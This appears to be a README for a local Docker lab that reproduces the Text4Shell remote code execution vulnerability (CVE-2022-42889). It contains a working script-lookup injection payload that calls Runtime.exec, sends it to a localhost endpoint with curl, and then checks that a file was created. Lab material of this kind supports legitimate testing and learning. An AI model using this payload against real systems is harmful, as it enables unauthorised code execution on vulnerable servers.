# Text4Shell CVE-2022-42889

### Build the Docker image

```bash
docker build --tag=text4shell .
```

### Run the Docker container

```bash
docker run -d --rm -p 8080:8080 text4shell
```

### Test the app by passing a string to the `search` parameter:

```bash
curl http://localhost/text4shell/attack?search=<anything>
```

### Attack can be performed by passing a string “${prefix:name}” where the prefix is the aforementioned lookup:

```java
${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
```

### Attack using curl:

```bash
curl -X GET "http://localhost:8080/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D"
```

> You can also try using `dns` or `url` prefixes

### Get the container id

```
docker container ls
```

### Get into the app

```
docker exec -it <container_id> bash
```

### To check if the above RCE was successful (You should see a file named `foo` created in the `/tmp` directory):

```
ls /tmp/
```

### To stop the container

```
docker container stop <container_id>
```
